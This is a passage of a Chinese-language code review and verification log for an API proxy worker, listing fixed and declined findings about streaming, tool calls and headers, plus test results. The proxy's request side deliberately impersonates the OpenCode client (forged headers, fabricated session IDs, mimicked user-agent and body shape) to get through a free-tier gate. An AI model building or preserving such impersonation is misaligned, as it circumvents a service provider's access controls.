| **R2-L7**（低） | 未填写 API Key 时前端拿字符串 `'dummy'` 真发请求探测（必然 401，误导用户以为模型 ID 错） | 已修：非 opencode 提供商且未填 Key 时直接 `toast('请先填写 API Key')` 返回，不再伪造探测 | 代码审查 |
| **R2-L4**（低） | 转发 Key 用明文 `===` 比较 | **不修**：理论时序侧信道，跨公网不可利用；且让 storage 依赖 auth 会引入循环依赖，`crypto.subtle.timingSafeEqual` 在非 CF 运行时也不可用 | — |
| **R2-L5**（低） | `p.id` 拼进 `onclick` | **不修**：`p.id` 写入侧有 `^[A-Za-z0-9._-]+$` 白名单，`k.id` 是 `crypto.randomUUID()`，两者都不含引号；不为不可利用路径重构 15 处模板 | — |

### 10.2 R1（OpenCode 伪装与翻译链路）

| 编号 | 问题 | 处置 | 验证 |
|---|---|---|---|
| **R1-M1**（中） | 非流式路径有 `tool_calls` 时把助手正文整段丢掉（客户端看不到模型说的话） | 已修：`if (text) message.content = text` 与 `tool_calls` 并存 | 新用例「正文与工具调用并存时两者都保留」 |
| **R1-M2**（中） | keepalive 包装流与 responses→chat 翻译流原样继承上游 `content-length`/`content-encoding`，与已被改写/解码的 body 不符 | 已修：两处改为剥离这两个头的新 `Headers` | 代码审查 + 现有流式用例 |
| **R1-M5**（中） | `response.incomplete` 恒报 `finish_reason: 'length'`，把已下发的 `tool_calls` 说成截断，agent 客户端会丢弃工具调用 | 已修：`hasToolCalls ? 'tool_calls' : type === 'response.incomplete' ? 'length' : 'stop'`（流式与非流式一致） | 新用例「已发出工具调用后 response.incomplete 记为 tool_calls 而非 length」+ 现有非流式用例 |
| **R1-L2**（低） | 未见过 `output_item.added` 的未知 `item_id` 的参数增量被回退到 index 0，污染第一个工具调用的参数 | 已修：`toolIdx[itemID]` 为 `undefined` 时直接丢弃该增量 | 新用例「未知 item_id 的参数增量被丢弃，不会污染 index 0」 |
| **R1-L6**（低） | `resolveOpenCodeUrls` 未按空白/逗号/分号切分镜像列表（与注释不符） | 已修：`raw.split(/[\s,;]+/)` | 代码审查 |
| **R1-L7**（低） | responses 非 SSE 分支用 `response.json()`，上游返回 HTML 200 时抛错 → 500 | 已修：改 `await response.text()` + `try JSON.parse`，解析失败原样透传状态码与正文 | 代码审查 |
| **R1-M3**（中） | body 无空闲/总超时，keepalive 心跳让上游挂死的流永不超时 | **不修**：长思考保活是针对免费通道的刻意设计；客户端断开已能中止上游（见 `clientSignal`），再加 body 超时会误杀长回答 | — |
| **R1-M4**（中） | 只认 `response.function_call_arguments.delta`，忽略 `output_item.done` 里的完整参数 | **不修**：实测 Zen 端点发 delta；补 `output_item.done` 属推测性上游差异，可能造成参数重复拼接 | — |
| **R1-M6/M7**（中） | 请求翻译丢弃 `stop`/`response_format`/`n` 等字段、不支持 legacy `role:'function'` | **不修**：最小字段集是免费通道采纳 shape 的一部分，擅自回填字段有触发 `FreeTierError` 的风险（用户硬性要求不动伪装） | — |
| **R1-M8**（中） | 上游未给 `call_id` 时回退空串 | **不修**：上游没给 id 时合成一个 `call_N` 并不能让上游上下文对得上（客户端回传的 `tool_call_id` 上游不认识），属改响应形状但无实证收益 | — |
| **R1-L1**（低） | 桩吞噬在「参数增量先于函数名」时会泄漏 | **不修**：真修法需要按 index 缓存参数再判定，而上游是 name-first 顺序 | — |
| **R1-L3**（低） | 匿名兜底通道不含 429 | **不修**：429 是限流而非鉴权失败，换匿名通道重试收益不明 | — |
| **R1-L4**（低） | `randomBase62` 取模偏置 | **不修**：ID 只需要唯一性，不需要均匀分布 | — |
| **R1-L5**（低） | 图像内容被丢弃；图片在首条消息时会话 ID 不稳定 | **不修**：涉及伪装核心的会话派生逻辑，按用户硬性约束不动 | — |

## 十一、第三轮验证记录（修复后）

| 命令 | 结果 |
|---|---|
| `npm run check`（`tsc --noEmit && vitest run`） | 类型检查零错误（`src/` + `test/`）；**4 文件 / 67 用例全部通过**（opencode 15、opencode-responses 30、admin-ssrf 6、admin-api 16） |
| `npm run bundle` | 生成 `worker.js`（158615 B，minify + `--charset=utf8`） |
| 伪装改动自查 | 第三轮对 OpenCode 通道的改动仅限：响应头剥离、`finish_reason` 语义、未知 `item_id` 丢弃、镜像 URL 切分、非 SSE 兜底解析、客户端断开中止上游。**请求侧伪装（伪造 headers、`ses_`/`msg_` ID 生成、free-lane gate、桩注入、镜像故障转移、UA 与 body shape）零改动** |

### 测试环境需知（避免误判为缺陷）

`src/storage.ts` 的内存缓存是**模块级、按 KV key 名索引**的（生产环境一个 isolate 只对应一个 KV namespace，语义正确）。测试里多个 `makeEnv()` 共用该缓存，会出现跨用例「看到别的 env 的数据」的现象；因此用例应**按 id 查找**而不是取 `list[0]`（`test/admin-api.spec.ts` 中已注明）。
